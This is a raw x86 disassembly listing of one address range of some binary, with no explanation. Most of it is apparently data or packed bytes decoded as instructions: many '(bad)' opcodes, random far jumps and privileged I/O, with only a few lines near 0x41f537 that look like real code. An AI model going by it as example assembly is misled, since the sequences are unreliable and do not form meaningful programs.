  41ef2b:	fidivr WORD PTR [edi+ecx*8+0x346f7369]
  41ef32:	sub    al,BYTE PTR [edi]
  41ef34:	test   DWORD PTR [ebx],0x2c091b50
  41ef3a:	jbe    0x41ef8f
  41ef3c:	inc    edi
  41ef3d:	test   BYTE PTR [ecx],ch
  41ef3f:	hlt    
  41ef40:	xchg   ebp,eax
  41ef41:	cmc    
  41ef42:	and    BYTE PTR [ebx-0x1d],dl
  41ef45:	add    eax,0x88842445
  41ef4a:	push   ds
  41ef4b:	inc    esi
  41ef4c:	xor    DWORD PTR [ecx+0x6c],eax
  41ef4f:	call   0x8829:0xfd00d700
  41ef56:	sub    eax,0xee66ee90
  41ef5b:	shl    al,0xc5
  41ef5e:	pop    edx
  41ef5f:	not    BYTE PTR [edx-0x72]
  41ef62:	aad    0x60
  41ef64:	imul   BYTE PTR [eax-0x7e]
  41ef67:	sub    ah,BYTE PTR [ebx]
  41ef69:	fs fwait
  41ef6b:	aad    0x45
  41ef6d:	stc    
  41ef6e:	cmc    
  41ef6f:	ror    esi,1
  41ef71:	push   ebx
  41ef72:	fcmovb st,st(2)
  41ef74:	push   0x4de1ba08
  41ef79:	std    
  41ef7a:	add    ebx,DWORD PTR [eax-0x29]
  41ef7d:	sub    al,0xef
  41ef7f:	or     ecx,eax
  41ef81:	mov    BYTE PTR [ebp-0x33],bh
  41ef84:	data16 (bad) 
  41ef87:	aas    
  41ef88:	mov    bh,0xb5
  41ef8a:	shr    BYTE PTR [esi],cl
  41ef8c:	adc    cl,dh
  41ef8e:	fild   QWORD PTR [eax-0x69fd27d2]
  41ef94:	outs   dx,BYTE PTR ds:[esi]
  41ef95:	mov    dh,BYTE PTR [ecx+0x600e746e]
  41ef9b:	inc    ecx
  41ef9c:	stos   BYTE PTR es:[edi],al
  41ef9d:	xchg   ebp,eax
  41ef9e:	mov    WORD PTR [edx-0x26492a1],ss
  41efa4:	sub    BYTE PTR [ebp-0x46],bh
  41efa7:	fcmovu st,st(6)
  41efa9:	xchg   edx,eax
  41efaa:	xchg   ecx,eax
  41efab:	mov    cl,0xf5
  41efad:	push   edi
  41efae:	add    al,0x1e
  41efb0:	adc    ebx,esp
  41efb2:	je     0x41f01b
  41efb4:	int    0x16
  41efb6:	(bad)  
  41efb7:	in     eax,dx
  41efb8:	pop    ebx
  41efb9:	mov    al,0x2a
  41efbb:	or     bh,dh
  41efbd:	ret    
  41efbe:	jno    0x41efee
  41efc0:	popf   
  41efc1:	test   BYTE PTR [edi+0x2f37ee43],dh
  41efc7:	pop    edi
  41efc8:	js     0x41ef6c
  41efca:	aad    0xb2
  41efcc:	loop   0x41efa3
  41efce:	inc    esi
  41efcf:	cmp    DWORD PTR [eax-0x56],ecx
  41efd2:	sub    dh,dl
  41efd4:	mov    al,0xce
  41efd6:	ins    BYTE PTR es:[edi],dx
  41efd7:	fsubr  DWORD PTR [edx+0x13ca9c22]
  41efdd:	sbb    eax,0xb1925c91
  41efe2:	xchg   edx,eax
  41efe3:	lods   eax,DWORD PTR ds:[esi]
  41efe4:	add    bh,dh
  41efe6:	jmp    0x41ef75
  41efe8:	retf   
  41efe9:	and    ah,BYTE PTR [edi+ebx*4]
  41efec:	mov    esp,0xf53840ba
  41eff1:	loop   0x41f05e
  41eff3:	(bad)  
  41eff4:	hlt    
  41eff5:	mov    eax,ds:0x358387d1
  41effa:	imul   edi,esi,0x39f49840
  41f000:	pushf  
  41f001:	stos   BYTE PTR es:[edi],al
  41f002:	push   ebp
  41f003:	rol    DWORD PTR [ecx],1
  41f005:	and    al,0xbf
  41f007:	test   al,0x26
  41f009:	jecxz  0x41f05f
  41f00b:	loopne 0x41efcc
  41f00d:	stc    
  41f00e:	fld    DWORD PTR [edx-0x1f]
  41f011:	lods   eax,DWORD PTR cs:[esi]
  41f013:	ret    0x6447
  41f016:	xor    DWORD PTR [ebp-0x52f6bfd6],ebp
  41f01c:	jno    0x41f059
  41f01e:	fucompp 
  41f020:	or     eax,0xd6000005
  41f025:	ret    0xd1c2
  41f028:	fcmovbe st,st(1)
  41f02a:	aad    0xc9
  41f02c:	fs pop esp
  41f02e:	inc    esi
  41f02f:	mov    cl,BYTE PTR [ecx+0x30]
  41f032:	popa   
  41f033:	ss leave 
  41f035:	inc    ebp
  41f036:	jg     0x41f0b0
  41f038:	jae    0x41f0b6
  41f03a:	js     0x41f0b4
  41f03c:	mov    edx,0x8e8cf2ea
  41f041:	int    0xf9
  41f043:	call   0xca79901a
  41f048:	mov    al,0x89
  41f04a:	adc    dh,BYTE PTR [edx+0x568649cd]
  41f050:	rol    BYTE PTR [ebx+0x3b2f80af],0x56
  41f057:	mov    ebp,0x421a6dd3
  41f05c:	inc    ebx
  41f05d:	ror    DWORD PTR [esi-0x375910e],1
  41f063:	jo     0x41f03d
  41f065:	jae    0x41f06c
  41f067:	in     eax,dx
  41f068:	dec    esi
  41f069:	push   es
  41f06a:	jns    0x41f015
  41f06c:	(bad)  
  41f06d:	jbe    0x41f058
  41f06f:	imul   eax,DWORD PTR [eax-0x9],0xa76b59c3
  41f076:	jmp    0x560f:0xb6f66682
  41f07d:	pop    ds
  41f07e:	ret    0xd25b
  41f081:	or     ebp,DWORD PTR [ebx-0x2e]
  41f084:	mov    al,ds:0x80915d48
  41f089:	mov    dh,BYTE PTR [ebx]
  41f08b:	jbe    0x41f041
  41f08d:	pop    ebx
  41f08e:	arpl   WORD PTR [ebx+0x154c8e44],bp
  41f094:	int    0xb2
  41f096:	push   ebx
  41f097:	out    dx,al
  41f098:	retf   0x3abf
  41f09b:	dec    edi
  41f09c:	aam    0xc1
  41f09e:	fistp  DWORD PTR [edi+edx*2+0x1b]
  41f0a2:	cmp    bl,BYTE PTR [eax+0x14df9e6c]
  41f0a8:	pusha  
  41f0a9:	jmp    0xd740:0x54cfa9c4
  41f0b0:	into   
  41f0b1:	jne    0x41f08e
  41f0b3:	pop    ecx
  41f0b4:	pop    es
  41f0b5:	jge    0x41f056
  41f0b7:	mov    ah,0x6b
  41f0b9:	xor    eax,0xde163fd7
  41f0be:	addr16 dec eax
  41f0c0:	push   esi
  41f0c1:	mov    dl,0x2d
  41f0c3:	fild   QWORD PTR [ebp+0x3e5bee9d]
  41f0c9:	ins    DWORD PTR es:[edi],dx
  41f0ca:	jne    0x41f0d6
  41f0cc:	(bad)  
  41f0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ce:	inc    esi
  41f0d0:	enter  0x6ee2,0x33
  41f0d4:	lods   eax,DWORD PTR ds:[esi]
  41f0d5:	or     al,0x72
  41f0d7:	mov    ecx,0x3be682a0
  41f0dc:	loopne 0x41f09b
  41f0de:	stos   BYTE PTR es:[edi],al
  41f0df:	loop   0x41f088
  41f0e1:	in     eax,0xb4
  41f0e3:	jno    0x41f07f
  41f0e5:	mov    eax,0x209fb121
  41f0ea:	mov    al,ds:0xe2947c
  41f0ef:	jbe    0x41f089
  41f0f1:	(bad)  
  41f0f2:	out    dx,al
  41f0f3:	icebp  
  41f0f4:	call   0x63ed:0xe66efa8
  41f0fb:	mov    al,ds:0x485f5bd1
  41f100:	std    
  41f101:	in     eax,dx
  41f102:	dec    esp
  41f103:	pop    ebp
  41f104:	jge    0x41f169
  41f106:	jnp    0x41f0c9
  41f108:	cmp    bh,BYTE PTR [ebp+0x6]
  41f10b:	aad    0xdc
  41f10d:	mov    edi,0x92b730e5
  41f112:	jecxz  0x41f154
  41f114:	mov    edx,0x5705259b
  41f119:	add    DWORD PTR [esi+eiz*4-0x1b],ecx
  41f11d:	mov    bl,BYTE PTR [ecx-0x4e]
  41f120:	cmp    bl,BYTE PTR [edx+0x18]
  41f123:	jmp    0x452ff379
  41f128:	ret    
  41f129:	mov    edi,0x2b47c459
  41f12e:	bound  edi,QWORD PTR [edi]
  41f130:	cli    
  41f131:	mov    al,0xb6
  41f133:	sbb    ecx,0x18
  41f136:	fst    DWORD PTR [esi-0x1e]
  41f139:	mov    bl,0x51
  41f13b:	xor    DWORD PTR [edi+0x3a4e689c],ebp
  41f141:	int    0x1a
  41f143:	lock jae 0x41f1c2
  41f146:	popa   
  41f147:	out    dx,eax
  41f148:	inc    ecx
  41f149:	das    
  41f14a:	cmp    BYTE PTR [esi+edx*8-0xf],0x1b
  41f14f:	jmp    0x41f1c1
  41f151:	sbb    BYTE PTR [eax-0x3c],al
  41f154:	push   edx
  41f155:	xchg   edx,eax
  41f156:	cmc    
  41f157:	cmc    
  41f158:	rcr    edx,1
  41f15a:	xor    al,0x80
  41f15c:	dec    ebp
  41f15d:	lods   eax,DWORD PTR ds:[esi]
  41f15e:	mov    edx,0x49f28e61
  41f163:	cwde   
  41f164:	jmp    0xfcd61cea
  41f169:	test   eax,0x8d40145e
  41f16e:	(bad)  
  41f16f:	sahf   
  41f170:	rcr    BYTE PTR [ecx],cl
  41f172:	fwait
  41f173:	pop    ebx
  41f174:	es cmp al,ah
  41f177:	jp     0x41f18c
  41f179:	test   BYTE PTR [edx],cl
  41f17b:	rol    BYTE PTR [esi-0x7b],1
  41f17e:	pop    eax
  41f17f:	popa   
  41f180:	push   eax
  41f181:	or     al,0x48
  41f183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f184:	dec    esi
  41f185:	sbb    eax,0xbadc1274
  41f18a:	pop    ecx
  41f18b:	cdq    
  41f18c:	in     al,dx
  41f18d:	mov    ebx,0xd90cb7b2
  41f192:	mov    bl,0x54
  41f194:	fiadd  WORD PTR [ebx+0x20]
  41f197:	into   
  41f198:	mov    bl,BYTE PTR [ebp+0x7d]
  41f19b:	xlat   BYTE PTR ds:[ebx]
  41f19c:	imul   edi,DWORD PTR [ecx],0x7656847e
  41f1a2:	xor    al,0xc4
  41f1a4:	retf   0xbfeb
  41f1a7:	jmp    ebp
  41f1a9:	mov    ecx,gs
  41f1ab:	jg     0x41f1ee
  41f1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ae:	jg     0x41f22d
  41f1b0:	push   eax
  41f1b1:	xchg   esi,eax
  41f1b2:	fstp   st(7)
  41f1b4:	fidivr DWORD PTR [eax+0x38]
  41f1b7:	js     0x41f181
  41f1b9:	adc    BYTE PTR [ecx],bh
  41f1bb:	aaa    
  41f1bc:	and    BYTE PTR [eax],ah
  41f1be:	out    dx,eax
  41f1bf:	push   edi
  41f1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1c1:	push   ds
  41f1c2:	jmp    0x41f1de
  41f1c4:	fistp  DWORD PTR [ebp-0x529f5fbb]
  41f1ca:	loop   0x41f15d
  41f1cc:	push   0xf6f34670
  41f1d1:	inc    DWORD PTR [ecx-0x10]
  41f1d4:	xor    DWORD PTR [eax-0x6612719f],ebx
  41f1da:	sbb    bh,cl
  41f1dc:	jo     0x41f1f8
  41f1de:	gs mov dh,0x36
  41f1e1:	push   edx
  41f1e2:	cdq    
  41f1e3:	aam    0xe
  41f1e5:	retf   
  41f1e6:	add    DWORD PTR [edi*4-0x5695d8cf],ebp
  41f1ed:	inc    ebx
  41f1ee:	js     0x41f173
  41f1f0:	ret    0xce44
  41f1f3:	or     eax,0xe07cf304
  41f1f8:	dec    edx
  41f1f9:	add    eax,esp
  41f1fb:	jl     0x41f1bd
  41f1fd:	sub    edx,eax
  41f1ff:	xchg   DWORD PTR [ecx+0x5c],esp
  41f202:	jno    0x41f231
  41f204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f205:	daa    
  41f206:	mov    edx,0xd28aa01b
  41f20b:	and    BYTE PTR [eax-0x51],al
  41f20e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f20f:	and    DWORD PTR ds:0x437dc049,edi
  41f215:	sub    DWORD PTR ds:0x1113f19b,eax
  41f21b:	mov    DWORD PTR ds:0x8e5a9049,eax
  41f221:	push   eax
  41f222:	imul   ecx,DWORD PTR [edi],0xffffffce
  41f225:	dec    ecx
  41f226:	inc    esi
  41f227:	repz inc ebx
  41f229:	xchg   ecx,eax
  41f22a:	fst    st(5)
  41f22c:	lods   al,BYTE PTR ds:[esi]
  41f22d:	test   al,0xa8
  41f22f:	push   ecx
  41f230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f231:	cmc    
  41f232:	cwde   
  41f233:	pop    edi
  41f234:	loopne 0x41f283
  41f236:	mov    al,ds:0x2b6cfe24
  41f23b:	outs   dx,BYTE PTR ds:[esi]
  41f23c:	call   0x7304:0x701ed2eb
  41f243:	mov    bh,0x51
  41f245:	push   ebp
  41f246:	sbb    DWORD PTR [ebp+0x4144f549],edi
  41f24c:	add    dl,BYTE PTR [ecx-0x4d746efa]
  41f252:	es dec si
  41f255:	lock lods al,BYTE PTR ds:[esi]
  41f257:	adc    eax,DWORD PTR ds:0xf889fd1
  41f25d:	mov    fs,WORD PTR [esi+edi*2]
  41f260:	mov    ecx,0x1567ca8f
  41f265:	cmp    bh,ch
  41f267:	in     al,0x7
  41f269:	pushf  
  41f26a:	imul   ebp,DWORD PTR [eax+edx*4],0x7baec92d
  41f271:	in     al,dx
  41f272:	(bad)  
  41f273:	loopne 0x41f253
  41f275:	in     eax,dx
  41f276:	cwde   
  41f277:	add    al,0x3a
  41f279:	mov    esp,0x281e7505
  41f27e:	cmp    al,0xec
  41f280:	cmp    DWORD PTR [eax+0x7e],ebp
  41f283:	push   eax
  41f284:	pop    esi
  41f285:	jno    0x41f2ba
  41f287:	jmp    0x1917:0xd56e2de0
  41f28e:	xor    al,dl
  41f290:	add    al,dl
  41f292:	fwait
  41f293:	retf   0xc0fe
  41f296:	int    0xdf
  41f298:	mov    edx,0xe00b9f3a
  41f29d:	mov    WORD PTR [edi],fs
  41f29f:	cmp    BYTE PTR [ebx+0x17],dl
  41f2a2:	lock xor BYTE PTR [edi-0x867dace],bh
  41f2a9:	add    bh,BYTE PTR [edi]
  41f2ab:	icebp  
  41f2ac:	mov    cl,0xe0
  41f2ae:	repnz add eax,0xeca807a5
  41f2b4:	and    eax,0x2d999db4
  41f2b9:	dec    esp
  41f2ba:	push   ebx
  41f2bb:	stos   BYTE PTR es:[edi],al
  41f2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2bd:	ss pop es
  41f2bf:	nop
  41f2c0:	out    dx,al
  41f2c1:	cs push ebx
  41f2c3:	sub    al,bh
  41f2c5:	push   esp
  41f2c6:	clc    
  41f2c7:	push   edi
  41f2c8:	stc    
  41f2c9:	and    eax,DWORD PTR [ebx+0xf]
  41f2cc:	sbb    al,0x4f
  41f2ce:	xchg   esi,eax
  41f2cf:	call   0x87e0:0x24d6474f
  41f2d6:	xlat   BYTE PTR ds:[ebx]
  41f2d7:	hlt    
  41f2d8:	add    BYTE PTR [edx+0x39],0xf6
  41f2dc:	mov    eax,ds:0x34c97a77
  41f2e1:	xor    eax,0xfb9bb204
  41f2e6:	(bad)  
  41f2e8:	add    edx,DWORD PTR [ecx-0x646b4845]
  41f2ee:	pop    ecx
  41f2ef:	bound  ebp,QWORD PTR [edi]
  41f2f1:	cmp    al,0x20
  41f2f3:	(bad)  
  41f2f5:	rol    BYTE PTR [edi+0x16a94dc9],cl
  41f2fb:	fsubr  DWORD PTR [ecx+0x2943b2bc]
  41f301:	leave  
  41f302:	cli    
  41f303:	retf   
  41f304:	ss scas al,BYTE PTR es:[edi]
  41f306:	xor    bl,0xd1
  41f309:	sar    dl,1
  41f30b:	and    eax,0xe484a191
  41f310:	mov    BYTE PTR [edx-0x5],ah
  41f313:	lock pop ds
  41f315:	pop    eax
  41f316:	sar    DWORD PTR [eax],0x45
  41f319:	cmp    eax,0x62c19d23
  41f31e:	dec    ebx
  41f31f:	leave  
  41f320:	push   ebp
  41f321:	jp     0x41f37c
  41f323:	in     eax,0xbb
  41f325:	jmp    0xd4ee213a
  41f32a:	inc    ebp
  41f32b:	lea    ecx,[esi]
  41f32d:	cmp    eax,0x48b62c92
  41f332:	lock xor dl,al
  41f335:	lds    esp,FWORD PTR [ecx+0x7c47fde1]
  41f33b:	add    ebp,DWORD PTR [ebp-0xf]
  41f33e:	mov    DWORD PTR [edi+0x1883a2ad],esp
  41f344:	js     0x41f396
  41f346:	mov    edx,DWORD PTR [edi+0x7db334c7]
  41f34c:	and    al,0x35
  41f34e:	fwait
  41f34f:	dec    eax
  41f350:	xor    BYTE PTR [eax+0x4be3c8d4],dl
  41f356:	sbb    BYTE PTR [ebx],dh
  41f358:	popf   
  41f359:	push   ss
  41f35a:	xor    eax,0x71a7ec7c
  41f35f:	in     al,dx
  41f360:	ror    ebx,1
  41f362:	and    esp,ebp
  41f364:	lea    esp,[eax-0x11ce2674]
  41f36a:	imul   eax,eax,0x72472172
  41f370:	and    bl,BYTE PTR [edi+edx*8]
  41f373:	fld    DWORD PTR [esp+esi*2+0x12]
  41f377:	pop    ebp
  41f378:	call   0xea12:0xf7538079
  41f37f:	int3   
  41f380:	rcl    ebp,cl
  41f382:	xchg   esp,eax
  41f383:	les    edx,FWORD PTR [ecx]
  41f385:	inc    ebp
  41f386:	and    dl,BYTE PTR [ebx]
  41f388:	or     dl,BYTE PTR [ebp-0x7eaacf53]
  41f38e:	jl     0x41f351
  41f390:	xor    eax,0x4f309d75
  41f395:	pop    ebx
  41f396:	gs pop esi
  41f398:	mov    eax,0x9e4b15ab
  41f39d:	jle    0x41f34a
  41f39f:	js     0x41f36a
  41f3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3a2:	das    
  41f3a3:	mov    ebx,0xb3064da5
  41f3a8:	or     eax,0xe52d19ac
  41f3ad:	push   ds
  41f3ae:	pop    ecx
  41f3af:	mov    ch,0x98
  41f3b1:	dec    esi
  41f3b2:	rcl    DWORD PTR [edi+0x41],0xa9
  41f3b6:	add    al,0x9f
  41f3b8:	mov    esi,0x5a80d188
  41f3bd:	cld    
  41f3be:	jg     0x41f3fd
  41f3c0:	es xchg ebx,eax
  41f3c2:	sub    al,0xa6
  41f3c4:	mov    WORD PTR [edi],ds
  41f3c6:	stc    
  41f3c7:	icebp  
  41f3c8:	loop   0x41f399
  41f3ca:	mov    esp,0x2a3f5cdc
  41f3cf:	in     eax,0xad
  41f3d1:	repnz mov ah,0x7f
  41f3d4:	add    edi,esp
  41f3d6:	jae    0x41f396
  41f3d8:	sti    
  41f3d9:	or     esp,DWORD PTR [edi-0x59]
  41f3dc:	retf   0xfea2
  41f3df:	cdq    
  41f3e0:	dec    eax
  41f3e1:	test   DWORD PTR [eax+0x1b0c497a],0x81c4895d
  41f3eb:	fld    QWORD PTR [edi+0x45]
  41f3ee:	ror    BYTE PTR [edi-0x3425b51d],0x16
  41f3f5:	dec    edx
  41f3f6:	jmp    0x1af67b0f
  41f3fb:	sub    al,0x31
  41f3fd:	mov    dl,0xc8
  41f3ff:	popf   
  41f400:	ret    0xccce
  41f403:	xor    DWORD PTR [ecx],esi
  41f405:	pop    ss
  41f406:	cs xchg ebx,eax
  41f408:	add    ch,BYTE PTR [ebp+0x65c95517]
  41f40e:	out    dx,eax
  41f40f:	loopne 0x41f489
  41f411:	cwde   
  41f412:	mov    dl,BYTE PTR [edi]
  41f414:	xchg   ecx,eax
  41f415:	adc    DWORD PTR ds:0xeb6932f6,esi
  41f41b:	push   edi
  41f41c:	push   0x7b
  41f41e:	push   es
  41f41f:	jae    0x41f409
  41f421:	mov    ah,0xb8
  41f423:	and    bl,ah
  41f425:	and    DWORD PTR [ecx],esp
  41f427:	mov    ?,WORD PTR [ebx]
  41f429:	lods   al,BYTE PTR ds:[esi]
  41f42a:	imul   edi,DWORD PTR [edi],0x33
  41f42d:	or     al,BYTE PTR [ebx-0x5a]
  41f430:	jp     0x41f410
  41f432:	push   esi
  41f433:	sbb    ebp,DWORD PTR [eax-0x1d68a85f]
  41f439:	xor    DWORD PTR [ecx],ecx
  41f43b:	rcr    edx,0x8e
  41f43e:	cmc    
  41f43f:	retf   0x9477
  41f442:	popa   
  41f443:	test   BYTE PTR [edx+0x5b],cl
  41f446:	mov    bl,0x81
  41f448:	sub    ch,BYTE PTR [eax]
  41f44a:	clc    
  41f44b:	xlat   BYTE PTR ds:[ebx]
  41f44c:	ret    
  41f44d:	ud1    ebx,DWORD PTR [edi-0x2aa95e58]
  41f454:	dec    edi
  41f455:	jbe    0x41f3fc
  41f457:	cmpxchg BYTE PTR [ebx],al
  41f45a:	mov    eax,0x7d3710e1
  41f45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f460:	in     eax,dx
  41f461:	dec    esi
  41f462:	cs js  0x41f3fe
  41f465:	xchg   DWORD PTR [ecx+0x57],ebp
  41f468:	(bad)  [edx+0x17]
  41f46b:	xchg   edi,eax
  41f46c:	xor    eax,0xe6faa680
  41f471:	dec    esp
  41f472:	cs jb  0x41f489
  41f475:	cmp    ah,BYTE PTR [di-0x776]
  41f47a:	and    ecx,DWORD PTR [esi+0x4cf66a14]
  41f480:	push   es
  41f481:	pushf  
  41f482:	and    al,0xd2
  41f484:	stos   BYTE PTR es:[edi],al
  41f485:	cld    
  41f486:	in     eax,0x11
  41f488:	scas   eax,DWORD PTR es:[edi]
  41f489:	push   0x16f1730c
  41f48e:	and    BYTE PTR [ebx*1-0x51cba54],dh
  41f495:	xchg   ebp,eax
  41f496:	sub    DWORD PTR [esi+0x58],ecx
  41f499:	dec    esp
  41f49a:	enter  0xf468,0xf6
  41f49e:	mov    al,0x5f
  41f4a0:	mov    edi,0x66093bba
  41f4a5:	test   BYTE PTR [ebx+0x33e51f08],bh
  41f4ab:	mov    cl,0xd7
  41f4ad:	clc    
  41f4ae:	pop    eax
  41f4af:	fcmovnbe st,st(1)
  41f4b1:	dec    esi
  41f4b2:	adc    esi,ebp
  41f4b4:	jp     0x41f49f
  41f4b6:	push   edx
  41f4b7:	out    0xfe,al
  41f4b9:	(bad)  
  41f4bc:	mov    edx,eax
  41f4be:	push   esi
  41f4bf:	jmp    0x41f456
  41f4c1:	leave  
  41f4c2:	xchg   esi,eax
  41f4c3:	jle    0x41f454
  41f4c5:	dec    esi
  41f4c6:	(bad)  
  41f4c7:	mov    bl,0x22
  41f4c9:	xchg   ebx,eax
  41f4ca:	push   esp
  41f4cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4cc:	out    dx,eax
  41f4cd:	inc    esp
  41f4ce:	jp     0x41f51c
  41f4d0:	push   edx
  41f4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4d2:	adc    ch,dh
  41f4d4:	scas   al,BYTE PTR es:[edi]
  41f4d5:	loopne 0x41f539
  41f4d7:	jg     0x41f527
  41f4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4da:	lods   eax,DWORD PTR ds:[esi]
  41f4db:	jp     0x41f48f
  41f4dd:	(bad)  [ebp-0x69]
  41f4e0:	lock adc eax,DWORD PTR [edx]
  41f4e3:	aas    
  41f4e4:	rcr    BYTE PTR [eax-0x6d],cl
  41f4e7:	sti    
  41f4e8:	ror    BYTE PTR [ecx-0x2b],cl
  41f4eb:	test   al,0x1c
  41f4ed:	pop    ecx
  41f4ee:	mov    eax,ds:0x9e34808a
  41f4f3:	sbb    eax,eax
  41f4f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4f6:	div    ebx
  41f4f8:	adc    ecx,ebx
  41f4fa:	ror    DWORD PTR [ebx+0x72e8d9e5],cl
  41f500:	push   esp
  41f501:	outs   dx,DWORD PTR ds:[esi]
  41f503:	add    bl,cl
  41f505:	pop    edx
  41f506:	int    0x6
  41f508:	mov    cl,0x64
  41f50a:	sbb    bh,BYTE PTR [edi]
  41f50c:	add    esp,DWORD PTR [ecx+0xe]
  41f50f:	(bad)  es:[edi]
  41f512:	hlt    
  41f513:	jbe    0x41f545
  41f515:	push   0x22
  41f517:	in     eax,0x46
  41f519:	imul   ecx,esp,0xffffffa0
  41f51c:	and    al,0x9
  41f51e:	sub    cl,BYTE PTR [ebx+0x55]
  41f521:	dec    eax
  41f522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f523:	xchg   edx,eax
  41f524:	test   DWORD PTR [eax+0x76],esi
  41f527:	inc    eax
  41f528:	push   es
  41f529:	lods   eax,DWORD PTR ds:[esi]
  41f52a:	inc    DWORD PTR [edi+0xdcff0ec]
  41f530:	into   
  41f531:	ja     0x41f53f
  41f537:	mov    edx,DWORD PTR [ebp-0x28]
  41f53a:	jmp    0x4228c5
  41f53f:	mov    edx,DWORD PTR [ebp-0x30]
  41f542:	mov    edi,DWORD PTR [ebp-0x4]
  41f545:	xor    edx,eax
  41f547:	xor    edi,eax
  41f549:	add    edi,ecx
  41f54b:	jmp    0x41fa5d
  41f550:	cmp    al,0xd0
  41f552:	les    edi,FWORD PTR ds:0xd9c9d1d4
  41f558:	jmp    0x45e7cea0
  41f55d:	sbb    DWORD PTR [eax],edx
  41f55f:	addr16 cmp al,0x48
  41f562:	jg     0x41f5dc
  41f564:	jae    0x41f5e2
  41f566:	js     0x41f5e0
  41f568:	lods   eax,DWORD PTR ds:[esi]
  41f569:	shl    BYTE PTR [ebx+0x38],1
  41f56c:	mov    ds:0x5a8add22,al
  41f571:	repnz mov cl,0x51
  41f574:	jae    0x41f5de
  41f576:	stos   BYTE PTR es:[edi],al
  41f577:	mov    al,ds:0x3f7bd77d
  41f57c:	pop    ss
  41f57d:	pop    ds
  41f57e:	xchg   ebx,eax
  41f57f:	sbb    eax,DWORD PTR [edx-0x38fb19a]
  41f585:	pusha  
  41f586:	daa    
  41f587:	or     eax,0x22b6ed22
  41f58c:	aaa    
  41f58d:	(bad)  
  41f58e:	jmp    0xc215:0xf1529b96
  41f595:	xchg   ebp,eax
  41f596:	jbe    0x41f5cd
  41f598:	add    cl,al
  41f59a:	jno    0x41f581
  41f59c:	pushf  
  41f59d:	ret    
  41f59e:	pop    esp
  41f59f:	jmp    esp
  41f5a1:	test   ebp,0xafbcc09b
  41f5a7:	fcom   QWORD PTR [edi-0x753c1fb0]
  41f5ad:	xor    esi,DWORD PTR [esi+ecx*1+0x4c]
  41f5b1:	sbb    ecx,DWORD PTR [ebx+ecx*2-0x44ecc9db]
  41f5b8:	dec    ecx
  41f5b9:	arpl   WORD PTR [edx-0x57],bp
  41f5bc:	xor    BYTE PTR [ebp-0x43],al
  41f5bf:	mov    ds:0x4871b1f3,al
  41f5c4:	push   0x9189b17b
  41f5c9:	loope  0x41f5fb
  41f5cb:	cdq    
  41f5cc:	lock jno 0x41f57a
  41f5cf:	cmp    ah,BYTE PTR [edx+0x3e2928e8]
  41f5d5:	add    al,0xed
  41f5d7:	in     eax,0xd2
  41f5d9:	cmc    
  41f5da:	popa   
  41f5db:	dec    ebx
  41f5dc:	(bad)  
  41f5dd:	fld    TBYTE PTR [edx]
  41f5df:	push   ss
  41f5e0:	dec    esi
  41f5e1:	xor    DWORD PTR [ebp+0x53],esi
  41f5e4:	jno    0x41f62b
  41f5e6:	xchg   esp,eax
  41f5e7:	or     BYTE PTR [ebp+0x5a],ah
  41f5ea:	and    eax,DWORD PTR [esi-0x47]
  41f5ed:	loope  0x41f5f1
  41f5ef:	mov    ds:0x57578d1d,al
  41f5f4:	cmp    ebx,ebx
  41f5f6:	sub    al,0xef
  41f5f8:	out    dx,eax
  41f5f9:	pop    ss
  41f5fa:	sub    DWORD PTR [edx+0x14b026e6],esi
  41f600:	mov    ebp,0x8b5f8ea4
  41f605:	int3   
  41f606:	push   0x79dca04
  41f60b:	xchg   edi,eax
  41f60c:	hlt    
  41f60d:	sub    al,0x41
  41f60f:	mov    ebx,0xfbbc0b01
  41f614:	popa   
  41f615:	mov    edi,0x79214bac
  41f61a:	enter  0xaf11,0x3
  41f61e:	jmp    0x27fb:0x1467863b
  41f625:	popf   
  41f626:	pusha  
  41f627:	xchg   esi,eax
  41f628:	jb     0x41f5db
  41f62a:	fwait
  41f62b:	jecxz  0x41f62a
  41f62d:	mov    dh,BYTE PTR [ebp+0xd71bee7]
  41f633:	ror    BYTE PTR [ecx],cl
  41f635:	std    
  41f636:	sahf   
  41f637:	fdivr  st,st(7)
  41f639:	(bad)  
  41f63a:	retf   0x62d5
  41f63d:	fcmovnbe st,st(4)
  41f63f:	in     eax,0xec
  41f641:	xlat   BYTE PTR ds:[ebx]
  41f642:	ja     0x41f5d5
  41f644:	cmp    eax,0xd8f65332
  41f649:	fwait
  41f64a:	mov    esp,cs
  41f64c:	cmc    
  41f64d:	test   eax,0xe3983bdd
  41f652:	addr16 mov ebx,0x235c7211
  41f658:	and    bl,ch
  41f65a:	(bad)  
  41f65b:	int    0xda
  41f65d:	aas    
  41f65e:	mov    ebp,0x778b970f
  41f663:	daa    
  41f664:	xor    esp,ebx
  41f666:	sbb    BYTE PTR [esi+0x3f],bl
  41f669:	lods   al,BYTE PTR ds:[esi]
  41f66a:	scas   eax,DWORD PTR es:[edi]
  41f66b:	adc    DWORD PTR [esi],edx
  41f66d:	mov    esp,0x380794d6
  41f672:	imul   ecx,DWORD PTR [ebx-0x431d8e73],0xf
  41f679:	jae    0x41f673
  41f67b:	ret    
  41f67c:	out    0x86,al
  41f67e:	imul   ebp,DWORD PTR [ebx+0x751b3bbe],0xffffffa2
  41f685:	push   es
  41f686:	outs   dx,DWORD PTR ds:[esi]
  41f687:	push   edx
  41f688:	stos   BYTE PTR es:[edi],al
  41f689:	adc    DWORD PTR [edi],esp
  41f68b:	retf   0xe98a
  41f68e:	mov    bh,0x56
  41f690:	fimul  WORD PTR [eax+esi*1-0x6e727649]
  41f697:	cmc    
  41f698:	clc    
  41f699:	and    esp,ebx
  41f69b:	push   ss
  41f69c:	aad    0xaf
  41f69e:	mov    BYTE PTR [edx+0xd85691d],ah
